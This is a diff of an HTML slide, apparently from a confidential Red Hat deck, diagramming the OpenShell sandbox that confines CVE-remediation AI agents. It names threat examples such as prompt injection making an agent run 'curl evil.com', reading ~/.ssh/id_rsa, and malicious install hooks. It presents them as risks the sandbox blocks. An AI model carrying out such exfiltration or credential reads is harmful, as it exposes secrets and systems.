@@ -3,178 +3,199 @@
   <div class="rh-privacy">Confidential: Red Hat associate and NDA partner use only. No further distribution.</div>
   <div class="rh-section-footer"><span class="rh-fn">10</span><span class="rh-fl"><img class="rh-logo-img" alt="Red Hat"></span></div>
 
-  <span class="section-label">OpenShell Sandbox</span>
-  <h2 style="margin-bottom:4px">End-to-End User Journey: Securing an AI Agent with OpenShell</h2>
+  <span class="section-label">OpenShell Agent Sandbox</span>
+  <h2 style="margin-bottom:2px">Per-Process Security for CVE Remediation Agents</h2>
 
-  <svg viewBox="0 0 1100 520" style="width:1100px;height:520px;font-family:'Red Hat Text','Red Hat Display',Arial,sans-serif" xmlns="http://www.w3.org/2000/svg">
+  <p style="font-size:13px;color:#555;margin:4px 0 10px 0">Containers limit <em>where</em> an agent runs. OpenShell limits <em>what each process inside it can do</em>. The agent runs unmodified — OpenShell wraps it with policy, credential injection, and audit.</p>
+
+  <svg viewBox="0 0 1100 480" style="width:1100px;height:480px;font-family:'Red Hat Text','Red Hat Display',Arial,sans-serif" xmlns="http://www.w3.org/2000/svg">
     <defs>
-      <marker id="os-ar" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6" fill="#666"/></marker>
-      <marker id="os-ar-red" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6" fill="#EE0000"/></marker>
-      <marker id="os-ar-teal" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6" fill="#009596"/></marker>
-      <linearGradient id="os-red" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#EE0000"/><stop offset="100%" stop-color="#AA0000"/></linearGradient>
-      <linearGradient id="os-teal" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#009596"/><stop offset="100%" stop-color="#007070"/></linearGradient>
-      <linearGradient id="os-purple" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#6753AC"/><stop offset="100%" stop-color="#4a3a80"/></linearGradient>
-      <linearGradient id="os-blue" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#0066CC"/><stop offset="100%" stop-color="#004499"/></linearGradient>
-      <filter id="os-glow"><feDropShadow dx="0" dy="1" stdDeviation="2" flood-color="#009596" flood-opacity="0.3"/></filter>
+      <marker id="os2-ar" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6" fill="#666"/></marker>
+      <linearGradient id="os2-red" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#EE0000"/><stop offset="100%" stop-color="#AA0000"/></linearGradient>
+      <linearGradient id="os2-teal" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#009596"/><stop offset="100%" stop-color="#006a6a"/></linearGradient>
+      <linearGradient id="os2-purple" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#6753AC"/><stop offset="100%" stop-color="#4a3a80"/></linearGradient>
+      <linearGradient id="os2-dark" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#252525"/><stop offset="100%" stop-color="#151515"/></linearGradient>
     </defs>
 
-    <!-- ═══ JOURNEY STEPS — horizontal flow ═══ -->
+    <!-- ═══ LEFT: SANDBOX ARCHITECTURE ═══ -->
+    <text x="10" y="18" font-size="12" font-weight="700" fill="#009596" letter-spacing="0.5">SANDBOX ARCHITECTURE</text>
 
-    <!-- Step 1: Login -->
-    <text x="30" y="22" font-size="15" font-weight="800" fill="#009596">1</text>
-    <g transform="translate(30,30)">
-      <rect width="190" height="100" rx="8" fill="url(#os-teal)" filter="url(#os-glow)"/>
-      <text x="95" y="24" text-anchor="middle" font-size="14" font-weight="700" fill="#fff">Dashboard Login</text>
-      <text x="95" y="44" text-anchor="middle" font-size="11" fill="#b3e6e6">Keycloak OIDC auth</text>
-      <text x="95" y="60" text-anchor="middle" font-size="11" fill="#b3e6e6">Platform admin role</text>
-      <text x="95" y="76" text-anchor="middle" font-size="11" fill="#b3e6e6">Gateway health check</text>
-      <text x="95" y="92" text-anchor="middle" font-size="11" fill="#b3e6e6">4 workspaces visible</text>
+    <!-- Outer: OpenShell Gateway -->
+    <rect x="10" y="26" width="520" height="260" rx="8" fill="#f0fafa" stroke="#009596" stroke-width="2"/>
+    <rect x="10" y="26" width="520" height="26" rx="8" fill="url(#os2-teal)"/>
+    <rect x="10" y="40" width="520" height="12" fill="url(#os2-teal)"/>
+    <text x="270" y="43" text-anchor="middle" font-size="11" font-weight="700" fill="#fff">OPENSHELL GATEWAY — control plane</text>
+
+    <!-- Inside: Supervisor -->
+    <rect x="24" y="62" width="492" height="210" rx="6" fill="#fff" stroke="#6753AC" stroke-width="1.5"/>
+    <rect x="24" y="62" width="492" height="22" rx="6" fill="url(#os2-purple)"/>
+    <rect x="24" y="74" width="492" height="10" fill="url(#os2-purple)"/>
+    <text x="270" y="79" text-anchor="middle" font-size="10" font-weight="700" fill="#fff">SUPERVISOR — PID 1 · Landlock · seccomp · process tracking</text>
+
+    <!-- Agent process -->
+    <g transform="translate(38,92)">
+      <rect width="220" height="80" rx="6" fill="url(#os2-red)"/>
+      <text x="110" y="18" text-anchor="middle" font-size="11" font-weight="700" fill="#fff">LW-AGENTS (Python)</text>
+      <text x="110" y="34" text-anchor="middle" font-size="9" fill="#ffcccc">Google ADK 2.10 · 6 specialist agents</text>
+      <text x="110" y="48" text-anchor="middle" font-size="9" fill="#ffcccc">CVE triage · remediation · test gen</text>
+      <text x="110" y="62" text-anchor="middle" font-size="9" fill="#ffcccc">Sees placeholder env vars only</text>
+      <text x="110" y="74" text-anchor="middle" font-size="8" fill="#ff9999">GEMINI_API_KEY=__openshell_managed__</text>
     </g>
 
-    <!-- Arrow 1→2 -->
-    <line x1="220" y1="80" x2="248" y2="80" stroke="#666" stroke-width="1.5" marker-end="url(#os-ar)"/>
-
-    <!-- Step 2: Explore Workspaces -->
-    <text x="252" y="22" font-size="15" font-weight="800" fill="#009596">2</text>
-    <g transform="translate(252,30)">
-      <rect width="190" height="100" rx="8" fill="url(#os-teal)" filter="url(#os-glow)"/>
-      <text x="95" y="24" text-anchor="middle" font-size="14" font-weight="700" fill="#fff">Explore Sandboxes</text>
-      <text x="95" y="44" text-anchor="middle" font-size="11" fill="#b3e6e6">Click into lw-agents sandbox</text>
-      <text x="95" y="60" text-anchor="middle" font-size="11" fill="#b3e6e6">Details · Logs · Terminal</text>
-      <text x="95" y="76" text-anchor="middle" font-size="11" fill="#b3e6e6">Providers (managed keys)</text>
-      <text x="95" y="92" text-anchor="middle" font-size="11" fill="#b3e6e6">Policy (network rules)</text>
+    <!-- Subprocess: Maven -->
+    <g transform="translate(38,180)">
+      <rect width="106" height="44" rx="4" fill="#f0f0f0" stroke="#999" stroke-width="1"/>
+      <text x="53" y="16" text-anchor="middle" font-size="9" font-weight="600" fill="#555">mvn compile</text>
+      <text x="53" y="30" text-anchor="middle" font-size="8" fill="#888">JDK 17 subprocess</text>
+      <text x="53" y="40" text-anchor="middle" font-size="7" fill="#999">inherits Landlock</text>
     </g>
 
-    <!-- Arrow 2→3 -->
-    <line x1="442" y1="80" x2="470" y2="80" stroke="#666" stroke-width="1.5" marker-end="url(#os-ar)"/>
-
-    <!-- Step 3: Credential + Policy -->
-    <text x="474" y="22" font-size="15" font-weight="800" fill="#6753AC">3</text>
-    <g transform="translate(474,30)">
-      <rect width="190" height="100" rx="8" fill="url(#os-purple)"/>
-      <text x="95" y="24" text-anchor="middle" font-size="14" font-weight="700" fill="#fff">Security Controls</text>
-      <text x="95" y="46" text-anchor="middle" font-size="11" fill="#d4c8f0">API key managed by gateway</text>
-      <text x="95" y="62" text-anchor="middle" font-size="11" fill="#d4c8f0">Agent never sees raw key</text>
-      <text x="95" y="80" text-anchor="middle" font-size="11" fill="#d4c8f0">L7 egress per-binary:</text>
-      <text x="95" y="94" text-anchor="middle" font-size="10" fill="#d4c8f0" font-family="monospace">googleapis.com:443 only</text>
+    <!-- Subprocess: git -->
+    <g transform="translate(152,180)">
+      <rect width="106" height="44" rx="4" fill="#f0f0f0" stroke="#999" stroke-width="1"/>
+      <text x="53" y="16" text-anchor="middle" font-size="9" font-weight="600" fill="#555">git push</text>
+      <text x="53" y="30" text-anchor="middle" font-size="8" fill="#888">GIT_ASKPASS</text>
+      <text x="53" y="40" text-anchor="middle" font-size="7" fill="#999">inherits Landlock</text>
     </g>
 
-    <!-- Arrow 3→4 -->
-    <line x1="664" y1="80" x2="692" y2="80" stroke="#666" stroke-width="1.5" marker-end="url(#os-ar)"/>
+    <!-- Policy Proxy -->
+    <g transform="translate(278,92)">
+      <rect width="220" height="132" rx="6" fill="#f8f5ff" stroke="#6753AC" stroke-width="1.5"/>
+      <text x="110" y="18" text-anchor="middle" font-size="11" font-weight="700" fill="#6753AC">POLICY PROXY</text>
+      <text x="110" y="34" text-anchor="middle" font-size="9" fill="#555">OPA / Rego engine</text>
 
-    <!-- Step 4: Agent Web UI -->
-    <text x="696" y="22" font-size="15" font-weight="800" fill="#EE0000">4</text>
-    <g transform="translate(696,30)">
-      <rect width="190" height="100" rx="8" fill="url(#os-red)"/>
-      <text x="95" y="24" text-anchor="middle" font-size="14" font-weight="700" fill="#fff">Agent Web UI</text>
-      <text x="95" y="44" text-anchor="middle" font-size="11" fill="#ffcccc">Served via OpenShell</text>
-      <text x="95" y="60" text-anchor="middle" font-size="11" fill="#ffcccc">service routing</text>
-      <text x="95" y="78" text-anchor="middle" font-size="11" fill="#ffcccc">Chat with CVE agent</text>
-      <text x="95" y="94" text-anchor="middle" font-size="11" fill="#ffcccc">Gemini through policy</text>
+      <text x="14" y="54" font-size="8.5" font-weight="600" fill="#3E8635">✓ ALLOW</text>
+      <text x="14" y="66" font-size="8" fill="#555" font-family="monospace">python → googleapis.com:443</text>
+      <text x="14" y="78" font-size="8" fill="#555" font-family="monospace">python → packages.redhat.com:443</text>
+      <text x="14" y="90" font-size="8" fill="#555" font-family="monospace">python → gitlab-host:443</text>
+      <text x="14" y="102" font-size="8" fill="#555" font-family="monospace">git → gitlab-host:443</text>
+
+      <text x="14" y="120" font-size="8.5" font-weight="600" fill="#CC0000">✗ DENY (everything else)</text>
+      <text x="14" y="132" font-size="7.5" fill="#888">nftables catch proxy bypass · SHA-256 binary verify</text>
     </g>
 
-    <!-- Arrow 4→5 -->
-    <line x1="886" y1="80" x2="914" y2="80" stroke="#666" stroke-width="1.5" marker-end="url(#os-ar)"/>
+    <!-- Arrow: proxy → external -->
+    <line x1="498" y1="160" x2="498" y2="160" stroke="#009596" stroke-width="1.5"/>
+    <text x="508" y="108" font-size="8" fill="#009596" font-weight="600">only allowed</text>
+    <text x="508" y="118" font-size="8" fill="#009596" font-weight="600">calls leave →</text>
+    <text x="508" y="132" font-size="7.5" fill="#888">real keys injected</text>
+    <text x="508" y="142" font-size="7.5" fill="#888">at egress by proxy</text>
 
-    <!-- Step 5: Verify -->
-    <text x="918" y="22" font-size="15" font-weight="800" fill="#3E8635">5</text>
-    <g transform="translate(918,30)">
-      <rect width="160" height="100" rx="8" fill="#f0f8f0" stroke="#3E8635" stroke-width="2"/>
-      <text x="80" y="24" text-anchor="middle" font-size="14" font-weight="700" fill="#3E8635">Verify Audit</text>
-      <text x="80" y="44" text-anchor="middle" font-size="11" fill="#555">Supervisor logs show</text>
-      <text x="80" y="60" text-anchor="middle" font-size="11" fill="#3E8635" font-weight="600">NET:OPEN ✓</text>
-      <text x="80" y="76" text-anchor="middle" font-size="11" fill="#555">for allowed endpoints</text>
-      <text x="80" y="92" text-anchor="middle" font-size="11" fill="#EE0000" font-weight="600">NET:DENIED ✗</text>
+    <!-- ═══ RIGHT: FIVE SECURITY LAYERS ═══ -->
+    <text x="560" y="18" font-size="12" font-weight="700" fill="#6753AC" letter-spacing="0.5">FIVE SECURITY LAYERS</text>
+    <text x="560" y="30" font-size="8.5" fill="#888">Each layer assumes the one below was breached</text>
+
+    <!-- L1 -->
+    <g transform="translate(560,40)">
+      <rect width="520" height="42" rx="5" fill="#f8f5ff" stroke="#6753AC" stroke-width="1"/>
+      <rect x="0" y="0" width="30" height="42" rx="5" fill="url(#os2-purple)"/>
+      <rect x="15" y="0" width="15" height="42" fill="url(#os2-purple)"/>
+      <text x="15" y="26" text-anchor="middle" font-size="10" font-weight="800" fill="#fff">L1</text>
+      <text x="42" y="16" font-size="10" font-weight="700" fill="#6753AC">OS-Level Isolation</text>
+      <text x="42" y="30" font-size="9" fill="#555">Landlock LSM (filesystem scoping) · seccomp-BPF (syscall filtering) · SELinux MAC</text>
+      <text x="42" y="40" font-size="8" fill="#888">Cannot be bypassed from userspace. Strongest per-process controls without a VM.</text>
     </g>
 
-    <!-- ═══ SECURITY LAYER — below the journey ═══ -->
-    <text x="30" y="165" font-size="13" font-weight="700" fill="#6753AC">What OpenShell Enforces at Every Step</text>
-
-    <g transform="translate(30,178)">
-      <rect width="250" height="80" rx="8" fill="#f8f5ff" stroke="#6753AC" stroke-width="1.5"/>
-      <text x="125" y="22" text-anchor="middle" font-size="13" font-weight="700" fill="#6753AC">🔑 Credential Management</text>
-      <text x="125" y="42" text-anchor="middle" font-size="11" fill="#555">API keys in gateway credential store</text>
-      <text x="125" y="58" text-anchor="middle" font-size="11" fill="#555">Injected at runtime as env var</text>
-      <text x="125" y="74" text-anchor="middle" font-size="11" fill="#555">Agent process never sees raw key</text>
+    <!-- L2 -->
+    <g transform="translate(560,86)">
+      <rect width="520" height="42" rx="5" fill="#f8f5ff" stroke="#6753AC" stroke-width="1"/>
+      <rect x="0" y="0" width="30" height="42" rx="5" fill="url(#os2-purple)"/>
+      <rect x="15" y="0" width="15" height="42" fill="url(#os2-purple)"/>
+      <text x="15" y="26" text-anchor="middle" font-size="10" font-weight="800" fill="#fff">L2</text>
+      <text x="42" y="16" font-size="10" font-weight="700" fill="#6753AC">Application Runtime</text>
+      <text x="42" y="30" font-size="9" fill="#555">ADK SafetyPlugin + RedactionPlugin · fail-closed scoring · JSON audit trail per tool call</text>
+      <text x="42" y="40" font-size="8" fill="#888">Understands what a "tool call" is. Creates forensic trail for compliance.</text>
     </g>
 
-    <g transform="translate(295,178)">
-      <rect width="250" height="80" rx="8" fill="#f8f5ff" stroke="#6753AC" stroke-width="1.5"/>
-      <text x="125" y="22" text-anchor="middle" font-size="13" font-weight="700" fill="#6753AC">🌐 Network Policy</text>
-      <text x="125" y="42" text-anchor="middle" font-size="11" fill="#555">L7 egress control per-binary</text>
-      <text x="125" y="58" text-anchor="middle" font-size="11" fill="#555">Per-endpoint, per-port rules</text>
-      <text x="125" y="74" text-anchor="middle" font-size="11" fill="#555">Every connection logged + auditable</text>
+    <!-- L3 -->
+    <g transform="translate(560,132)">
+      <rect width="520" height="42" rx="5" fill="#f8f5ff" stroke="#6753AC" stroke-width="1"/>
+      <rect x="0" y="0" width="30" height="42" rx="5" fill="url(#os2-purple)"/>
+      <rect x="15" y="0" width="15" height="42" fill="url(#os2-purple)"/>
+      <text x="15" y="26" text-anchor="middle" font-size="10" font-weight="800" fill="#fff">L3</text>
+      <text x="42" y="16" font-size="10" font-weight="700" fill="#6753AC">Container / Orchestration</text>
+      <text x="42" y="30" font-size="9" fill="#555">Non-root (UID 1001) · drop ALL caps · read-only rootfs · zero-secret credential architecture</text>
+      <text x="42" y="40" font-size="8" fill="#888">Compromised container holds zero long-lived secrets to exfiltrate.</text>
     </g>
 
+    <!-- L4 -->
     <g transform="translate(560,178)">
-      <rect width="250" height="80" rx="8" fill="#f8f5ff" stroke="#6753AC" stroke-width="1.5"/>
-      <text x="125" y="22" text-anchor="middle" font-size="13" font-weight="700" fill="#6753AC">📁 Filesystem Isolation</text>
-      <text x="125" y="42" text-anchor="middle" font-size="11" fill="#555">Landlock enforcement</text>
-      <text x="125" y="58" text-anchor="middle" font-size="11" fill="#555">Read-only system paths</text>
-      <text x="125" y="74" text-anchor="middle" font-size="11" fill="#555">Writable sandbox directory only</text>
+      <rect width="520" height="42" rx="5" fill="#f8f5ff" stroke="#6753AC" stroke-width="1"/>
+      <rect x="0" y="0" width="30" height="42" rx="5" fill="url(#os2-purple)"/>
+      <rect x="15" y="0" width="15" height="42" fill="url(#os2-purple)"/>
+      <text x="15" y="26" text-anchor="middle" font-size="10" font-weight="800" fill="#fff">L4</text>
+      <text x="42" y="16" font-size="10" font-weight="700" fill="#6753AC">Network</text>
+      <text x="42" y="30" font-size="9" fill="#555">Per-binary L7 policy (OPA/Rego) · nftables bypass prevention · OCSF audit events per connection</text>
+      <text x="42" y="40" font-size="8" fill="#888">python→googleapis.com:443 ✓ · curl→evil.com ✗ · Domain-level filtering prevents exfiltration.</text>
     </g>
 
-    <g transform="translate(825,178)">
-      <rect width="250" height="80" rx="8" fill="#f8f5ff" stroke="#6753AC" stroke-width="1.5"/>
-      <text x="125" y="22" text-anchor="middle" font-size="13" font-weight="700" fill="#6753AC">⚙️ Process Supervision</text>
-      <text x="125" y="42" text-anchor="middle" font-size="11" fill="#555">OpenShell supervisor as PID 1</text>
-      <text x="125" y="58" text-anchor="middle" font-size="11" fill="#555">Agent lifecycle management</text>
-      <text x="125" y="74" text-anchor="middle" font-size="11" fill="#555">Configurable restart policies</text>
+    <!-- L5 -->
+    <g transform="translate(560,224)">
+      <rect width="520" height="42" rx="5" fill="#f8f5ff" stroke="#6753AC" stroke-width="1"/>
+      <rect x="0" y="0" width="30" height="42" rx="5" fill="url(#os2-purple)"/>
+      <rect x="15" y="0" width="15" height="42" fill="url(#os2-purple)"/>
+      <text x="15" y="26" text-anchor="middle" font-size="10" font-weight="800" fill="#fff">L5</text>
+      <text x="42" y="16" font-size="10" font-weight="700" fill="#6753AC">VM / Hardware</text>
+      <text x="42" y="30" font-size="9" fill="#555">Kata Containers (KVM per-pod) · Confidential Containers (SEV-SNP/TDX) · throwaway VM boundary</text>
+      <text x="42" y="40" font-size="8" fill="#888">Container escape lands in a disposable VM, not the host node. Optional for higher-risk agents.</text>
     </g>
 
-    <!-- ═══ COMPARISON TABLE ═══ -->
-    <text x="30" y="292" font-size="13" font-weight="700" fill="#151515">With vs Without OpenShell</text>
+    <!-- ═══ BOTTOM LEFT: WHAT OPENSHELL SOLVES ═══ -->
+    <text x="10" y="306" font-size="12" font-weight="700" fill="#CC0000" letter-spacing="0.5">WHAT CONTAINER ISOLATION MISSES</text>
 
-    <!-- Table header -->
-    <rect x="30" y="300" width="520" height="26" rx="4" fill="#151515"/>
-    <text x="170" y="318" text-anchor="middle" font-size="12" font-weight="700" fill="#fff">Without OpenShell</text>
-    <text x="420" y="318" text-anchor="middle" font-size="12" font-weight="700" fill="#fff">With OpenShell</text>
-
-    <!-- Row 1 -->
-    <rect x="30" y="326" width="250" height="28" fill="#fff8f8" stroke="#eee" stroke-width="0.5"/>
-    <text x="45" y="344" font-size="11" fill="#CC0000">API keys in env vars — agent reads them</text>
-    <rect x="280" y="326" width="270" height="28" fill="#f0fff0" stroke="#eee" stroke-width="0.5"/>
-    <text x="295" y="344" font-size="11" fill="#3E8635">Keys in gateway — agent never sees raw value</text>
-
-    <!-- Row 2 -->
-    <rect x="30" y="354" width="250" height="28" fill="#fff" stroke="#eee" stroke-width="0.5"/>
-    <text x="45" y="372" font-size="11" fill="#CC0000">K8s NetworkPolicy — coarse, namespace-level</text>
-    <rect x="280" y="354" width="270" height="28" fill="#f0fff0" stroke="#eee" stroke-width="0.5"/>
-    <text x="295" y="372" font-size="11" fill="#3E8635">L7 policy per-binary, per-endpoint</text>
-
-    <!-- Row 3 -->
-    <rect x="30" y="382" width="250" height="28" fill="#fff8f8" stroke="#eee" stroke-width="0.5"/>
-    <text x="45" y="400" font-size="11" fill="#CC0000">Container has full filesystem access</text>
-    <rect x="280" y="382" width="270" height="28" fill="#f0fff0" stroke="#eee" stroke-width="0.5"/>
-    <text x="295" y="400" font-size="11" fill="#3E8635">Landlock restricts reads/writes per-path</text>
-
-    <!-- Row 4 -->
-    <rect x="30" y="410" width="250" height="28" fill="#fff" stroke="#eee" stroke-width="0.5"/>
-    <text x="45" y="428" font-size="11" fill="#CC0000">Agent runs unsupervised as PID 1</text>
-    <rect x="280" y="410" width="270" height="28" fill="#f0fff0" stroke="#eee" stroke-width="0.5"/>
-    <text x="295" y="428" font-size="11" fill="#3E8635">Supervisor manages lifecycle + recovery</text>
-
-    <!-- Row 5 -->
-    <rect x="30" y="438" width="250" height="28" fill="#fff8f8" stroke="#eee" stroke-width="0.5"/>
-    <text x="45" y="456" font-size="11" fill="#CC0000">Manual namespace/SCC setup</text>
-    <rect x="280" y="438" width="270" height="28" fill="#f0fff0" stroke="#eee" stroke-width="0.5"/>
-    <text x="295" y="456" font-size="11" fill="#3E8635">Managed workspace — auto-creates everything</text>
-
-    <!-- ═══ KEY INSIGHT ═══ -->
-    <g transform="translate(580,300)">
-      <rect width="490" height="170" rx="8" fill="#e8f8f8" stroke="#009596" stroke-width="1.5"/>
-      <text x="245" y="24" text-anchor="middle" font-size="13" font-weight="700" fill="#009596">Key Insight</text>
-      <text x="245" y="48" text-anchor="middle" font-size="12" fill="#333">The same container image runs with or without OpenShell.</text>
-      <text x="245" y="68" text-anchor="middle" font-size="12" fill="#333">OpenShell adds the security layer on top —</text>
-      <text x="245" y="88" text-anchor="middle" font-size="12" fill="#333">isolation, credential management, network policy,</text>
-      <text x="245" y="108" text-anchor="middle" font-size="12" fill="#333">filesystem enforcement — without any code</text>
-      <text x="245" y="128" text-anchor="middle" font-size="12" fill="#333">changes to the agent.</text>
-      <text x="245" y="156" text-anchor="middle" font-size="11" fill="#009596" font-weight="600">Zero agent code changes. Full enterprise security.</text>
+    <g transform="translate(10,314)">
+      <rect width="258" height="58" rx="5" fill="#fff8f8" stroke="#CC0000" stroke-width="1"/>
+      <text x="12" y="16" font-size="9" font-weight="700" fill="#CC0000">1. Network Exfiltration</text>
+      <text x="12" y="30" font-size="8.5" fill="#555">Prompt injection → agent runs curl evil.com</text>
+      <text x="12" y="42" font-size="8.5" fill="#555">Pod NetworkPolicy can't tell python from curl</text>
+      <text x="12" y="54" font-size="8" fill="#3E8635" font-weight="600">Fix: Per-binary OPA policy · only python→googleapis</text>
     </g>
 
-    <!-- ═══ URLS ═══ -->
-    <g transform="translate(30,480)">
-      <text font-size="10" fill="#888"><tspan font-weight="600">Dashboard:</tspan> openshell-dashboard-013.apps.ocp.qn6c5.sandbox1388.opentlc.com</text>
-      <text y="16" font-size="10" fill="#888"><tspan font-weight="600">Agent UI (via OpenShell):</tspan> lightwell-agents--lightwell-agents--agent-ui.openshell-svc.apps.ocp.qn6c5.sandbox1388.opentlc.com/dev-ui/</text>
+    <g transform="translate(274,314)">
+      <rect width="258" height="58" rx="5" fill="#fff8f8" stroke="#CC0000" stroke-width="1"/>
+      <text x="12" y="16" font-size="9" font-weight="700" fill="#CC0000">2. Filesystem Overreach</text>
+      <text x="12" y="30" font-size="8.5" fill="#555">Agent editing /workspace reads ~/.ssh/id_rsa</text>
+      <text x="12" y="42" font-size="8.5" fill="#555">Container mounts are all-or-nothing</text>
+      <text x="12" y="54" font-size="8" fill="#3E8635" font-weight="600">Fix: Landlock LSM · explicit path allowlist · irreversible</text>
+    </g>
+
+    <g transform="translate(10,378)">
+      <rect width="258" height="58" rx="5" fill="#fff8f8" stroke="#CC0000" stroke-width="1"/>
+      <text x="12" y="16" font-size="9" font-weight="700" fill="#CC0000">3. Credential Exposure</text>
+      <text x="12" y="30" font-size="8.5" fill="#555">API keys in env vars readable by agent + subprocesses</text>
+      <text x="12" y="42" font-size="8.5" fill="#555">Agent pushes key to Git or leaks via prompt</text>
+      <text x="12" y="54" font-size="8" fill="#3E8635" font-weight="600">Fix: Zero keys in sandbox · proxy injects at egress</text>
+    </g>
+
+    <g transform="translate(274,378)">
+      <rect width="258" height="58" rx="5" fill="#fff8f8" stroke="#CC0000" stroke-width="1"/>
+      <text x="12" y="16" font-size="9" font-weight="700" fill="#CC0000">4. Subprocess Inheritance</text>
+      <text x="12" y="30" font-size="8.5" fill="#555">pip install → postinstall inherits all agent perms</text>
+      <text x="12" y="42" font-size="8.5" fill="#555">Malicious package gets network + files + keys</text>
+      <text x="12" y="54" font-size="8" fill="#3E8635" font-weight="600">Fix: /proc ancestry tracking · TOFU binary SHA-256</text>
+    </g>
+
+    <!-- ═══ BOTTOM RIGHT: LW-AGENTS SPECIFIC ═══ -->
+    <text x="560" y="290" font-size="12" font-weight="700" fill="#EE0000" letter-spacing="0.5">LW-AGENTS IN OPENSHELL</text>
+
+    <g transform="translate(560,298)">
+      <rect width="520" height="142" rx="6" fill="#fff6f6" stroke="#EE0000" stroke-width="1.5"/>
+
+      <text x="14" y="20" font-size="10" font-weight="700" fill="#EE0000">Integration: Pattern 1 — Whole-Agent Sandboxing</text>
+      <text x="14" y="36" font-size="9" fill="#555" font-family="monospace">openshell sandbox create --from ghcr.io/rrbanda/lw-agents:latest \</text>
+      <text x="14" y="48" font-size="9" fill="#555" font-family="monospace">  --forward 8080 --provider gemini --provider gitlab</text>
+
+      <text x="14" y="68" font-size="10" font-weight="700" fill="#6753AC">Allowed Egress (per-binary)</text>
+      <text x="14" y="82" font-size="9" fill="#555">python → generativelanguage.googleapis.com:443  (Gemini inference)</text>
+      <text x="14" y="94" font-size="9" fill="#555">python → packages.redhat.com:443  (Lightwell OSV feed + .rhlw artifacts)</text>
+      <text x="14" y="106" font-size="9" fill="#555">python → api.osv.dev:443 · services.nvd.nist.gov:443 · api.first.org:443</text>
+      <text x="14" y="118" font-size="9" fill="#555">git → gitlab-gitlab.apps.cluster-*.dyn.redhatworkshops.io:443</text>
+      <text x="14" y="132" font-size="9" fill="#CC0000" font-weight="600">Everything else: DENIED · logged as OCSF event · visible in dashboard</text>
+    </g>
+
+    <!-- ═══ KEY POINT ═══ -->
+    <g transform="translate(10,448)">
+      <rect width="1080" height="28" rx="5" fill="url(#os2-dark)"/>
+      <text x="540" y="19" text-anchor="middle" font-size="11" font-weight="700" fill="#fff">Zero code changes to the agent. Same image runs with or without OpenShell. The security layer wraps — it doesn't rewrite.</text>
     </g>
   </svg>
